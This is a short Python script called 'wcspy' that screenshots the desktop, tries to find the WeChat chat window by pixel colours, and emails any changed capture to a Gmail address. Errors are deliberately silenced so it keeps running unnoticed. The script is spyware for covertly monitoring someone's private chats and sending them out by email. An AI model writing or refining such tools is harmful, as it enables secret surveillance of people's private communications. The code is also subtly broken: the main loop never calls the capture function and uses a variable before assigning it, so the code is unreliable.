import time
import smtplib
import ssl
import urllib.request

from io import BytesIO
from PIL import ImageGrab
from PIL import ImageChops
from datetime import datetime
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# send the wechat window capture and send to email
# copied from: https://realpython.com/python-send-email/
def sendImage(img):
    sendSelfEmail = 'xxx@gmail.com'
    sendSelfPassword = 'xxx'

    sendEmail = sendSelfEmail
    sendPassword = sendSelfPassword

    recvEmail = sendSelfEmail
    sendSubject = datetime.now().strftime("wcspy.%d.%m.%Y.%H.%M.%S.jpg")

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sendEmail
    message["To"] = recvEmail
    message["Subject"] = sendSubject
    message["Bcc"] = recvEmail  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText("auto send by wcspy", "plain"))

    # Convert the img to image file in memory
    imgf = BytesIO()
    img.save(imgf, "JPEG", quality=50)
    imgf.seek(0)

    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(imgf.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {sendSubject}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sendEmail, sendPassword)
        server.sendmail(sendEmail, recvEmail, text)


# detect the wechat window
# copied from https://blog.csdn.net/fujliny/article/details/109411343
def captureWCWindow():
    img = ImageGrab.grab()
    width = img.size[0]
    height = img.size[1]
    imgData = img.getdata()

    upPixIndex = -1
    downPixIndex = -1

    scanLineCount = 6
    for i in range(scanLineCount):
        for j in range(height):
            pixIndex = j * width + i * int(width / (scanLineCount + 1))
            try:
                if upPixIndex < 0 and imgData[pixIndex] == (231, 231, 231):
                    if imgData[pixIndex - width] == (245, 245, 245) and imgData[pixIndex + width] == (245, 245, 245):
                        for long in range(1, 21):
                            if imgData[pixIndex + long] != (231, 231, 231):
                                break
                        else:
                            upPixIndex = pixIndex

                elif downPixIndex < 0 and imgData[pixIndex] == (236, 236, 236):
                    if imgData[pixIndex - width] == (245, 245, 245) and imgData[pixIndex + width] in ((245, 245, 245), (255, 255, 255)):
                        for long in range(1, 21):
                            if imgData[pixIndex + long] != (236, 236, 236):
                                break
                        else:
                            downPixIndex = pixIndex

            except IndexError:
                return None

    if upPixIndex < 0 or downPixIndex < 0:
        return None

    upPixStartIndex   = upPixIndex
    upPixEndIndex     = upPixIndex

    while imgData[upPixStartIndex - 1] == (231, 231, 231):
        upPixStartIndex = upPixStartIndex - 1

    while imgData[upPixEndIndex + 1] == (231, 231, 231):
        upPixEndIndex = upPixEndIndex + 1

    downPixStartIndex = downPixIndex
    downPixEndIndex   = downPixIndex

    while imgData[downPixStartIndex - 1] == (231, 231, 231):
        downPixStartIndex = downPixStartIndex - 1

    while imgData[downPixEndIndex + 1] == (236, 236, 236):
        downPixEndIndex = downPixEndIndex + 1

    return img.crop((upPixStartIndex % width, upPixStartIndex // width, downPixEndIndex % width, downPixEndIndex // width))


def main():
    lastImg = None
    currImg = None

    while True:
        try:
            if lastImg is None or currImg is None:
                # didn't get anything
                sleepSec = min(sleepSec + 1, 5)
            else:
                diff = ImageChops.difference(lastImg, currImg)
                if diff.getbbox():
                    sendImage(currImg)
                    sleepSec = max(sleepSec - 1, 1)
        except:
            # mute any error
            # don't stop the program anyway
            pass

        lastImg = currImg
        time.sleep(sleepSec)


if __name__ == '__main__':
    main()
